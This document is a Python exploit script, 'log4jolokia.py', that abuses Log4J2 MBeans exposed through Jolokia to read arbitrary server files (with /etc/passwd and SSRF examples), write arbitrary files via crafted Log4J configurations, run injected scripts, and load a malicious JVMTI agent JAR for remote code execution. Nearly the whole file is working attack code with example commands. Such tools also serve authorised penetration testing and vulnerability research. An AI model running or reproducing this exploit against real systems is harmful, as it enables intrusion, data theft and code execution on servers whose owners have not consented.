#!/usr/bin/python3

from xml.sax.saxutils import escape
import argparse
import requests
from requests.auth import HTTPBasicAuth
import re
from argparse import RawTextHelpFormatter
import base64
import string

class Validator(object):

    def __init__(self, pattern):
        self._pattern = re.compile(pattern)

    def __call__(self, value):
        if not self._pattern.match(value):
            raise argparse.ArgumentTypeError(
                "Argument has to match '{}'".format(self._pattern.pattern))
        return value

url = Validator(r"^http[s]?://.*$")

### argparse
parser = argparse.ArgumentParser(
			prog='log4jolokia.py',
			description='Jolokia exploit for reading, writing and/or executing code via Log4J',
			add_help=False,
			formatter_class=RawTextHelpFormatter)

modes = ["exec_jar", "write_file", "read_file", "exec_script"]
parser.add_argument('mode', nargs='+',help='choose mode: exec_jar | write_file | read_file',choices=modes)
parser.add_argument('target', nargs='+',help='URL to jolokia (e.g. http://127.0.0.1:8161/console/jolokia)',type=url)

parser.add_argument('-u','--user', nargs='?',help='Jolokia username',default='')
parser.add_argument('-p','--passwd', nargs='?',help='Jolokia password',default='')

parser.add_argument('--proxy', nargs='?',help='Optional HTTP(S) Proxy (e.g. burp at http://127.0.0.1:8080)',default='')

parser.add_argument('-H','--header', nargs='?',help='Other required custom HTTP headers (e.g. -H "Origin: http://localhost"\n\t-H "Referrer: http://localhost")',action='append')

args, _ = parser.parse_known_args()

mode_parser = argparse.ArgumentParser(parents=[parser], formatter_class=RawTextHelpFormatter)

mode = args.mode[0]

if mode == 'read_file':
	### read file
	mode_parser.add_argument('-r','--read', nargs='?',help='Absolute or relative path of a file to read on target (Use only with mode: read_file)',required=True)
	mode_parser.epilog = """Example commands:
	- Absolute Path:
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r /etc/passwd -u admin -p admin -H 'Origin: http://localhost'
	- Relative Path:
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r ./artemis -u admin -p admin -H 'Origin: http://localhost'
	- Specific Protocol:
		-- FTP:
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r ftp://test:test@127.0.0.1:22/test -u admin -p admin -H 'Origin: http://localhost'
		-- SMB (Windows only):
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r file:////127.0.0.1/C/test -u admin -p admin -H 'Origin: http://localhost'
		-- HTTP SSRF (Usually no output):
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r 'http://127.0.0.1:80/test?test=test' -u admin -p admin -H 'Origin: http://localhost'
	"""
elif mode == 'write_file':
	### write file
	mode_parser.add_argument('-lf','--local_file', nargs='?',help='Path to local file to be written on the target (Use only with mode: write_file)',required=True)
	mode_parser.add_argument('-w','--write', nargs='?',help='Path of file to be written on the target (Use only with mode: write_file)',required=True)
	mode_parser.add_argument('--tmp_dir', nargs='?',help='''Location of a writable directory. (Default value is "/tmp")
		E.g. Unix == /tmp
     		Windows == C:/Users/Public''',default='/tmp')
	mode_parser.epilog = """Example command:
	python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -lf 00-ff.txt -w /tmp/test_write -u admin -p admin -H 'Origin: http://localhost'
	"""
elif mode == 'exec_jar':
	### exec jar
	mode_parser.add_argument('-j','--jar', nargs='?',help='Path to local jar to be executes on the target (Use only with mode: exec_jar)',required=True)
	mode_parser.add_argument('--tmp_dir', nargs='?',help='''Location of a writable directory. (Default value is "/tmp")
		E.g. Unix == /tmp
     		Windows == C:/Users/Public''',default='/tmp')
	mode_parser.epilog = "Example command:\n\tpython3 log4jolokia.py exec_jar http://127.0.0.1:8161/console/jolokia/ -j mal_linux.jar -u admin -p admin -H 'Origin: http://localhost'"
	mode_parser.epilog += """\n\nValid jvmtiAgent JARs can be obtained from https://github.com/mbadanoiu/jvmtiAgentLoad-Exploit
	"""
elif mode == 'exec_script':
	### exec script
	mode_parser.add_argument('-sf','--script_file', nargs='?',help='Path to local file containing the script to be executed on the target (Use only with mode: exec_script)',required=True)
	mode_parser.add_argument('-l','--language', nargs='?',help='Language of the script to be executed (E.g. javascript, groovy, beanshell, etc.) (Use only with mode: exec_script)',required=True)
	mode_parser.epilog = "Example command:\n\tpython3 log4jolokia.py exec_script http://127.0.0.1:8161/console/jolokia/ -s rce.js -l javascript -u admin -p admin -H 'Origin: http://localhost'"
else:
	### how did we get here?
	print("[!] Invalid Mode selected")
	print("[!] Exiting")
	exit(1)

args = mode_parser.parse_args()
### argparse


### request authorization and headers
auth = None
if args.user and args.passwd:
	auth = HTTPBasicAuth(args.user, args.passwd)

proxy = None
if args.proxy:
	proxy = {'http':args.proxy, 'https':args.proxy}

headers = {}
if args.header:
	for i in args.header:
		# add headers
		h, v = i.split(": ")
		headers |= [(h, v)]
### request authorization and headers


### Static content
xml_template = """<?xml version="1.1" encoding="iso-8859-1"?>
<Configuration status="debug" name="X" packages="">
<Appenders>
<RollingFile name="X" fileName="<<<WRITE_PATH>>>" filePattern="<<<TMP_DIR>>>/x%d{yyyy}%i" append="false">
<PatternLayout>
<Pattern>
<<<PATTERN>>>
</Pattern>
</PatternLayout>
<Policies>
<SizeBasedTriggeringPolicy size="1"/>
</Policies>
</RollingFile>
</Appenders>
<Loggers>
<Root level="debug">
<AppenderRef ref="X"/>
</Root>
</Loggers>
</Configuration>""".replace("\n","")

properties_template = """rootLogger.level=DEBUG
rootLogger.appenderRef.logfile.ref=RollingFile
appender.logfile.type=RollingRandomAccessFile
appender.logfile.name=RollingFile
appender.logfile.fileName=<<<WRITE_PATH>>>
appender.logfile.filePattern=<<<TMP_DIR>>>/p-%d{yyyy}%i
appender.logfile.append=false
appender.logfile.filePermissions=rwxrwxrwx
appender.logfile.layout.type=PatternLayout
appender.logfile.layout.charset=iso-8859-1
appender.logfile.policies.type=Policies
appender.logfile.policies.size.type=SizeBasedTriggeringPolicy
appender.logfile.policies.size.size=2
appender.logfile.layout.pattern=<<<PATTERN>>>
"""

xml_script_template = """<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="debug" name="RCETest">
<Loggers>
<Logger name="EventLogger" level="debug" additivity="false">
<ScriptFilter onMatch="ACCEPT" onMisMatch="DENY">
<Script name="RCE" language="<<<LANGUAGE>>>">
<<<PAYLOAD>>>
</Script>
</ScriptFilter>
</Logger>
<Root level="debug">
<ScriptFilter onMatch="ACCEPT" onMisMatch="DENY">
<ScriptRef ref="RCE"/>
</ScriptFilter>
</Root>
</Loggers>
</Configuration>
""".replace("\n","")
### Static content


### Code Section
def json_encode(str):
	res = ""
	for i in str:
		res += "\\u" + hex(ord(i))[2:].zfill(4)
	return res

def is_printable(str):
	printable = string.printable
	for i in str:
		if not i in printable:
			return False
	return True

def error(res):
	print(f"[!] Server returned status response {res.status_code}")
	print(f"[!] Either the request failed (authentication or server problems) or no valid mbeans were found")
	print("[!] Exiting")
	exit(1)

def get_mbeans(target, auth=None, headers=None, verbose=True):
	# look for log4j2 mbean
	if target[-1] == "/":
		target_list = target + "list"
	else:
		target_list = target + "/list"

	if verbose:
		print(f"[.] Looking for \"org.apache.logging.log4j2\" mbeans in {target_list}")

	res = requests.get(target_list, auth=auth, headers=headers, verify=False, proxies=proxy)

	try:
		log4j_json = res.json()["value"]["org.apache.logging.log4j2"]
	except:
		error(res)

	types = []

	for k in log4j_json:
		if "type=" in k:
			type = "org.apache.logging.log4j2:type="+k.split("type=")[1]
			if not type in types:
				types.append(type)
				print(f"[+] Found Log4J Mbean {type}")
	return types

def setConfigLocationUri(target, path, mbean, verbose=True):
	if verbose:
		print(f"[.] Setting ConfigLocationUri to point to arbitrary location {path}")

	data={"attribute": "ConfigLocationUri", "mbean": mbean, "type": "write", "value": path}
	res = requests.post(target, auth=auth, headers=headers, json=data, verify=False, proxies=proxy)

	try:
		status = res.json()["status"]
	except:
		error(res)

	if status == 200:
		if verbose:
			print(f"[+] Successfully set ConfigLocationUri to \"{path}\" ")
	else:
		print(f"[!] Jolokia write on ConfigLocationUri returned status {status}")
#		print(res.text)
		print("[!] Exiting")
		exit(1)

def getConfigText(target, mbean, verbose=True):
	if verbose:
		print("[.] Reading file output from ConfigText")

	data={"arguments": ["iso-8859-1"], "mbean": mbean, "operation": "getConfigText(java.lang.String)", "type": "exec"}
	res2 = requests.post(target, auth=auth, headers=headers, json=data, verify=False, proxies=proxy)

	try:
		value = res2.json()["value"]
	except:
		error(res2)

	# already latin-1 / iso-8859-1
	return value

def read_file(target, path, mbean, verbose=True):
	# set ConfigLocationURI
	# read mbean
	if verbose:
		print(f"[.] Using mbean {mbean}")

	setConfigLocationUri(target, path, mbean)

	file_contents = getConfigText(target, mbean)

	if is_printable(file_contents):
		print(f"[+] Content of \"{path}\":\n")
		print(file_contents)
	else:
		print(f"[.] File \"{path}\" contains non-printable characters, displaying base64 encoding")
		print(f"[+] Base64 content of \"{path}\":\n")
		print(base64.b64encode(file_contents.encode('latin-1')).decode('latin-1'))

def escape_log4j_pattern(pay):
	res = ""

	# Special log4j pattern characters
	for i in pay:
		if i == '\\':
			res += "\\\\"
		elif i == '%':
			res += "%%"
		elif i == '\n':
			res += "\\n"
		elif i == '\r':
			res += "\\r"
		elif i == '{':
			res += "\{"
		else:
			res += i

	return res

def gen_log4j_config(content, path, tmp_dir='/tmp/', verbose=True):
	# check if content contains any XML restricted chars
	# if all valid => direct xml
	# if any invalid => xml contains properties that contains file to be written
	valid_xml = [0x9, 0xa, 0xd] + list(range(0x20, 0xff+1))

	if verbose:
		print("[.] Generating Log4J configuration")

	tmp_file = None
	for i in content:
		if not ord(i) in valid_xml:
			tmp_file = tmp_dir + "/mal.properties"
			if verbose:
				print("[.] Invalid XML characters have been detected in the content")
				print("[.] Using a 2 step write techique (XML -> Properties -> File)")
			break

	if not tmp_file:
		content = escape(content)
		xml = xml_template
		xml = xml.replace("<<<TMP_DIR>>>", tmp_dir)
		xml = xml.replace("<<<WRITE_PATH>>>", path)
		xml = xml.replace("<<<PATTERN>>>", content)
		print("[+] Generated Log4J XML configuration")
	else:
		content = json_encode(escape_log4j_pattern(content)).replace("\\","\\\\")
		prop = properties_template
		prop = prop.replace("<<<TMP_DIR>>>", tmp_dir)
		prop = prop.replace("<<<WRITE_PATH>>>", path)
		prop = prop.replace("<<<PATTERN>>>", content)
		print("[+] Generated Log4J Properties configuration")
		prop = escape(prop)
		xml = xml_template
		xml = xml.replace("<<<TMP_DIR>>>", tmp_dir)
		xml = xml.replace("<<<WRITE_PATH>>>", tmp_file)
		xml = xml.replace("<<<PATTERN>>>", prop)
		print("[+] Embedded Properties configuration in a XML configuration")

	return xml, tmp_file

def setConfigText(target, xml, mbean, verbose=True):
	if verbose:
		print("[.] Using setConfigText to load the Log4J XML configuration")

	data={"arguments": [xml, "utf-8"], "mbean": mbean, "operation": "setConfigText(java.lang.String,java.lang.String)", "type": "exec"}
	res = requests.post(target, auth=auth, headers=headers, json=data, verify=False, proxies=proxy)

	try:
		status = res.json()["status"]
	except:
		error(res)

	if status == 200:
		if verbose:
			print("[+] Successfully called setConfigText()")
	else:
		print(f"[!] Jolokia setConfigText returned status {status}")
#		print(res.text)
		print("[!] Exiting")
		exit(1)

def write_file(target, local_file, path, mbean, tmp_dir="/tmp", verbose=True):
	if verbose:
		print(f"[.] Reading content from {local_file}")

	f = open(local_file, "rb")
	content = f.read().decode('latin-1')
	f.close()

	# generate valid Log4J config with static pattern
	log4j_xml, tmp_file = gen_log4j_config(content, path, tmp_dir)

	# send XML to setConfigText()
	# do this twice in order to flush the buffer writing to the file
	# !!! not the most elegant of solutions but it works
	if verbose:
		print("[.] Using a double setConfigText in order to flush the buffer")
	setConfigText(target, log4j_xml, mbean, verbose=False)
	setConfigText(target, log4j_xml, mbean)

	if tmp_file:
		print(f"[+] File \"{tmp_file}\" should have successfully been written on the target")

		# set ConfigLocationURI to tmp file (twice to flush the buffer writing to the tmp_file)
		# !!! not the most elegant of solutions but it works
		if verbose:
			print(f"[.] Using a double setConfigLocationUri in order to flush the buffer and finish writing \"{tmp_file}\" ")
		tmp_file = "file:" + tmp_file
		setConfigLocationUri(target, tmp_file, mbean, verbose=False)
		setConfigLocationUri(target, tmp_file, mbean)

	# check if file was successfully written to the target
	if verbose:
		print(f"[.] Checking that the file \"{path}\" was written successfully on the target")

	setConfigLocationUri(target, path, mbean, verbose=False)
	written = getConfigText(target, mbean, verbose=False)

	# XML eliminates trailing white spaces, \n, \r, \t
	if content.rstrip() == written:
		print(f"[+] File \"{path}\" has been successfully written on the target")
	else:
		print("[!] The given content does not match the content retreived from the target")
		print("[!] Exiting")
		exit(1)

def exec_jar(target, jar, mbean, tmp_dir='/tmp'):
	x = input(f"""\n[!!!] WARNING: You are about to write and execute the contents of "{jar}" on the target system. Make sure that:
	- The JAR contains a valid JVM TI agent
	- Once a JAR is successfully loaded:
		-- No new JAR can be loaded until the Java applicaiton is restarted (a.k.a. pick your commands wisely because you only have one shot)
		-- The JAR code will execute everytime the jvmtiAgentLoad() function is successfully called (result == "return code: 0")

If you agree with the above enter "yes" to continue: """)

	if x.lower() != "yes":
		print("[!] Non-yes option received")
		print("[!] Exiting")
		exit(0)

	path = tmp_dir + "/mal.jar"
	write_file(target, jar, path, mbean, tmp_dir)

	# jvmtiAgentLoad
	data={"arguments": [path], "mbean": "com.sun.management:type=DiagnosticCommand", "operation": "jvmtiAgentLoad([Ljava.lang.String;)", "type": "exec"}
	res = requests.post(target, auth=auth, headers=headers, json=data, verify=False, proxies=proxy)

	try:
		value = res.json()["value"]
	except:
		error(res)

	if "return code: 0" in value:
		print("[+] Successfully called jvmtiAgentLoad()")
	else:
		print(f"[!] Jolokia jvmtiAgentLoad returned error: {value}")
#		print(res.text)
		print("[!] Exiting")
		exit(1)

def exec_script(target, script_file, language, mbean):
	x = input(f"""\n[!!!] WARNING: You are about to execute a {language} script from the "{script_file}" file. 
Keep in mind that this script will be triggered multiple times.

If you agree with the above enter "yes" to continue: """)

	if x.lower() != "yes":
		print("[!] Non-yes option received")
		print("[!] Exiting")
		exit(0)

	print(f"[.] Reading {language} script from {script_file}")
	f = open(script_file, "rb")
	content = f.read().decode('latin-1')
	f.close()

	# generate valid Log4J config containing a script payload
	xml_script = xml_script_template
	payload = escape(content)
	xml_script = xml_script.replace("<<<PAYLOAD>>>", payload)
	xml_script = xml_script.replace("<<<LANGUAGE>>>", language)

	# send XML to setConfigText()
	setConfigText(target, xml_script, mbean)

	# calling setConfigText() again in order to force the script to trigger
	setConfigText(target, "<Configuration></Configuration>", mbean, verbose=False)

	print("[+] The script should have been successfully executed")

### Code Section


### MAIN
target = args.target[0]
mbean = get_mbeans(target, auth, headers)[0]

if mode == "read_file":
	read_file(target, args.read, mbean)
elif mode == "write_file":
	write_file(target, args.local_file, args.write, mbean, args.tmp_dir)
elif mode == "exec_jar":
	exec_jar(target, args.jar, mbean, args.tmp_dir)
elif mode == "exec_script":
	exec_script(target, args.script_file, args.language, mbean)
